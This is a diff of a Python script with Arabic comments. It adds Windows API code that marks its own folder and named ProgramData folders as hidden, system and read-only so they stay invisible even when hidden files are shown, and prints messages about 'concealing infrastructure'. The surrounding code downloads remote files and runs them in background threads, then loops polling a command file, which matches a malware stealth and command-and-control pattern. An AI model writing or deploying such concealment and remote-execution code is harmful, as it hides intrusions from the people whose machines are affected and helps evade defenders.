@@ -235,33 +235,79 @@ def run_script(path):
 
 
 def startup():
-    threads = []
-
     for filename, url in FILES.items():
         path = ensure_file(filename, url)
-
         t = threading.Thread(target=run_script, args=(path,), daemon=True)
         t.start()
-        threads.append(t)
 
-    # إبقاء البرنامج الرئيسي حيًا إذا كانت الملفات تحتوي على loops
-    for t in threads:
-        t.join()
+if __name__ == "__main__":
+    threading.Thread(target=startup, daemon=True).start()
 
+
+
+import ctypes
+import os
+from pathlib import Path
+
+# --- الإعدادات ---
+# أضف هنا أي مسارات مجلدات خارجية تريد إخفاءها تماماً
+EXTRA_TARGETS = [
+    r"C:\ProgramData\WinCore",
+    r"C:\ProgramData\WinExec"
+]
+
+def apply_deep_stealth(target_path):
+    """
+    تطبيق سمات النواة: مخفي + نظام + قراءة فقط + منع الفهرسة.
+    تجعل الملف غير مرئي حتى مع تفعيل 'إظهار الملفات المخفية'.
+    """
+    try:
+        # FILE_ATTRIBUTE_READONLY (0x01) | HIDDEN (0x02) | SYSTEM (0x04) | NOT_CONTENT_INDEXED (0x2000)
+        attrs = 0x01 | 0x02 | 0x04 | 0x2000
+        path_str = str(target_path)
+        
+        # التنفيذ عبر Windows API مباشرة
+        success = ctypes.windll.kernel32.SetFileAttributesW(path_str, attrs)
+        return success
+    except Exception:
+        return False
+
+def protect_assets(target_dir):
+    """تطبيق الإخفاء على المجلد وكل ما بداخله"""
+    path = Path(target_dir)
+    if not path.exists():
+        return
+
+    # 1. إخفاء كل الملفات داخل المجلد
+    for item in path.rglob('*'): # rglob تجلب كل شيء في المجلدات الفرعية أيضاً
+        apply_deep_stealth(item)
     
+    # 2. إخفاء المجلد الرئيسي نفسه
+    apply_deep_stealth(path)
 
+def start_concealment_protocol():
+    # المرحلة أ: إخفاء المجلد الحالي (الذي يحتوي على السكربت والملفات الأربعة)
+    current_dir = Path(__file__).parent.resolve()
+    print(f"[*] Concealing infrastructure at: {current_dir}")
+    protect_assets(current_dir)
 
+    # المرحلة ب: إخفاء المجلدات الخارجية المحددة في EXTRA_TARGETS
+    for target in EXTRA_TARGETS:
+        if os.path.exists(target):
+            print(f"[*] Applying deep stealth to external target: {target}")
+            protect_assets(target)
+        else:
+            print(f"[!] Target not found, skipping: {target}")
 
-# حلقة المراقبة الصامتة
+if __name__ == "__main__":
+    # تشغيل البروتوكول
+    start_concealment_protocol()
 
 
 if not os.path.exists(BASE_DIR):
     os.makedirs(BASE_DIR)
 
-
-
-def listen():
-    while True:
+while True:
     if os.path.exists(CMD_FILE):
         try:
             with open(CMD_FILE, "r") as f:
@@ -313,18 +359,4 @@ def listen():
             pass
 
     time.sleep(1)
-
-
-if __name__ == "__main__":
-    # تشغيل ملفات المونيتور والديفندر في خيوط منفصلة
-    t1 = threading.Thread(target=startup)
-    t1.start()
-
-    # تشغيل حلقة المراقبة في الخيط الرئيسي
-    listen()
-
-
-
-
-
 
